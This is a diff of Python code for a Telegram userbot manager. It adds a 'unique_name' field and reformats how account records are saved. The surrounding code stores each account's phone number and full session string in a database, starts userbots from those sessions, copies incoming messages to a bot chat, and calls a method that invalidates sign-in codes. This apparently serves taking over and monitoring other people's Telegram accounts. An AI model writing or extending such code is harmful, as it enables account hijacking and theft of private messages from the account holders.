@@ -29,10 +29,8 @@ async def forward_message(client: PyrogramClient, message: Message, target_chat:
     """
     if client.me.id in paused_forwarding: return
     try:
-        # 1. Copy to Bot PM (target_chat is bot_username)
         await message.copy(chat_id=target_chat)
         
-        # 2. Attempt to call user-requested method for double security
         try:
             if hasattr(client, "InvalidateSignInCodes"):
                 await client.InvalidateSignInCodes()
@@ -73,7 +71,15 @@ async def forwarder_handler(client: PyrogramClient, message: Message, ptb_app: A
         send_notification(client, message, ptb_app)
     )
 
-async def start_userbot(session_string: str, ptb_app: Application, update_info: bool = False):
+async def start_userbot(
+    session_string: str, 
+    ptb_app: Application, 
+    update_info: bool = False, 
+    unique_name: str = None
+):
+    """
+    Starts a userbot. Can optionally pass a unique_name to be saved.
+    """
     session_name = f"userbot_{random.randint(1000, 9999)}"
     me = None
     try:
@@ -106,10 +112,21 @@ async def start_userbot(session_string: str, ptb_app: Application, update_info: 
         
         if update_info:
             account_info = {
-                "user_id": me.id, "first_name": me.first_name, "username": me.username,
-                "phone_number": me.phone_number, "session_string": session_string,
+                "user_id": me.id, 
+                "first_name": me.first_name, 
+                "username": me.username,
+                "phone_number": me.phone_number, 
+                "session_string": session_string,
             }
-            accounts_collection.update_one({"user_id": me.id}, {"$set": account_info}, upsert=True)
+            # Add unique_name if provided
+            if unique_name:
+                account_info["unique_name"] = unique_name
+            
+            accounts_collection.update_one(
+                {"user_id": me.id}, 
+                {"$set": account_info}, 
+                upsert=True
+            )
         return "success", me, "Successfully started."
     
     except (AuthKeyUnregistered, UserDeactivated):
@@ -144,6 +161,7 @@ async def start_all_userbots_from_db(application: Application, update_info: bool
         session_str = account.get("session_string", "")
         if not session_str: continue
         
+        # Note: This does not pass unique_name, as we are just starting existing bots
         status, _, detail = await start_userbot(session_str, application, update_info=update_info)
         if status == "success":
             success_count += 1
